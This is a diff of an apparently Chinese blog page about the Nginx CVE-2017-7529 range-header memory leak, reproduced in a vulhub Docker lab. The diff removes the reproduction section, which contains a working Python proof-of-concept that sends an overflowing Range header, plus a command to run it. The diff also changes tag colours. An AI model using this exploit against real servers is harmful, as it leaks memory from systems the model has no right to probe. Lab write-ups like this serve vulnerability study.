@@ -219,31 +219,6 @@
 cd vulhub/nginx/CVE-2017-7529
 docker-compose up -d
 </code></pre>
-<h1 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4. 漏洞复现"></a>4. 漏洞复现</h1><p>使用POC进行验证</p>
-<pre><code class="bash">python poc.py http://xxx.xxx.xxx.xxx:8080/
-</code></pre>
-<h1 id="5-漏洞POC"><a href="#5-漏洞POC" class="headerlink" title="5. 漏洞POC"></a>5. 漏洞POC</h1><pre><code class="python">#!/usr/bin/env python
-import sys
-import requests
-
-if len(sys.argv) &lt; 2:
-    print(&quot;%s url&quot; % (sys.argv[0]))
-    print(&quot;eg: python %s http://your-ip:8080/&quot; % (sys.argv[0]))
-    sys.exit()
-
-headers = &#123;
-    &#39;User-Agent&#39;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;
-&#125;
-offset = 605
-url = sys.argv[1]
-file_len = len(requests.get(url, headers=headers).content)
-n = file_len + offset
-headers[&#39;Range&#39;] = &quot;bytes=-%d,-%d&quot; % (
-    n, 0x8000000000000000 - n)
-
-r = requests.get(url, headers=headers)
-</code></pre>
-
             
         </div>
     </div>
@@ -257,17 +232,17 @@ r = requests.get(url, headers=headers)
         
         <span class="tag">
             
-            <a href="/tags/Nginx/" style="color: #00bcd4">Nginx</a>
+            <a href="/tags/Nginx/" style="color: #00a596">Nginx</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/" style="color: #ffa2c4">Web服务器漏洞</a>
+            <a href="/tags/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/" style="color: #00bcd4">Web服务器漏洞</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/CVE/" style="color: #03a9f4">CVE</a>
+            <a href="/tags/CVE/" style="color: #ffa2c4">CVE</a>
         </span>
         
     </div>
@@ -326,7 +301,7 @@ r = requests.get(url, headers=headers)
         
         <span class="tag">
             
-            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ff7d73">渗透测试</a>
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #00a596">渗透测试</a>
         </span>
         
     </div>
